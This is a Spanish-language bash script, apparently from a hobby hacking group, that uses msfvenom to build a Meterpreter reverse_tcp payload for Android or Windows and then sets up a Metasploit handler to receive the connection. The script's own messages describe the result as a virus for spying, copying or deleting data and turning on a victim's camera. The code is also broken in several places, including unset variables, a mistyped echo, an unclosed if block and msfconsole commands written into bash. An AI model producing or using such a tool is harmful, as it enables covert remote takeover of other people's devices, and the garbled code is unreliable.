#!/bin/bash

# Configuracion de color bash
BLACK="\e[1;30m"
GREEN="\e[1;32m"
CYAN="\e[1;36m"
RED="\e[1;31m"
RESET="\e[1;37m"
WHITE="\e[0m"

clear
neofetch
if [[ "$password" == "e9lovfgvwg" ]]; then
echo "Continuando..."
echo -e "${CYAN}selecciona una opcion para continuar ${GREEN}yes${CYAN}/${RED}no${WHITE}"
read -p "seleccione una opcion: " opcion
echo ""
echo -e "${CYAN}asegurese de poner el comando msfconsole y despues ejecutar este script para su correcto funcionamiento asegurese de cumplir esta recomendacion"
echo ""
echo -e "${CYAN}==============================================================="
echo -e "${CYAN} Instalando dependencias esto puede tardar unos minutos..."
echo -e "${CYAN}==============================================================="
echo -e "${RED}web = ${GREEN}https://github.com/LuxuryDragon13/LuxuryDragon13.github.io"
echo -e "${RED}SYSTEMA = ${GREEN}ToxicOs"
echo -e "${RED}DISCORD = ${GREEN}https://discord.gg/SrGMfHNtHv"
echo -e "${RED}cloaboradores = ${GREEN}74, H4CK3R2, FOB0KZ"
echo -e "${RED}INVITANOS = ${GREEN}"
echo -e "${CYAN}==============================================================="
echo -e "                           ${GREEN}sistemas"
echo -e "                              ${RED}Android"
echo -e "                              ${RED}Windows"
echo -e "${CYAN}==============================================================="
  read -p "INGRESE EL NOMBRE DEL SISTEMA: " SYS
  read -p "INGRESE SU IP: " IP
  read -p "INGRESE UN NUMERO 4 DIGITOS: " PORT
  read -p "INGRESE UN NOMBRE PARA LA APP: " NAME
  
  echo -e "${GREEN}ejecute el script de nuevo pero use la opcion 3"
  echo -e "${RED} y este virus se puede ejecutar en tu dispositivo para probar si jala no es dañino nomas sirve para espiar, copiar o eliminar datos puedes encender la camara, etc."
  
  msfvenom -p $SYS/meterpreter/reverse_tcp LHOST=$IP LPORT=PORT R > $NAME

 echo -e "${CYAN}==============================================================="
 echo -e "${CYAN}pon la opcion 1 para poder continuar y poderte conectar a el"
 echo -e "${CYAN}victima para poder tener acceso a su dispositivo completamente"
 echo -e "${CYAN}si no sabes hacerlo ve a nuestro canal de youtube"
 echo -3 "${CYAN}https://www.youtube.com/channel/UCWwpRxk5d_aycN9IU38S3Kg"
 echo -e "${CYAN}==============================================================="
if [[ "$option" == "1a"]]; then
  echo -e "${CYAN}Continuando con el script..."
  read -p "INGRESE LA IP ANTERIOR: "
  read -p "INGRESE EL PUERTO ANTERIOR: "
  
  use exploit/multi/handler
  set lhost $IP
  set lport $port
  run
 
else
    echo -e "${RED}opcion incorrecta. Saliendo del script...${WHITE}"
    exit
fi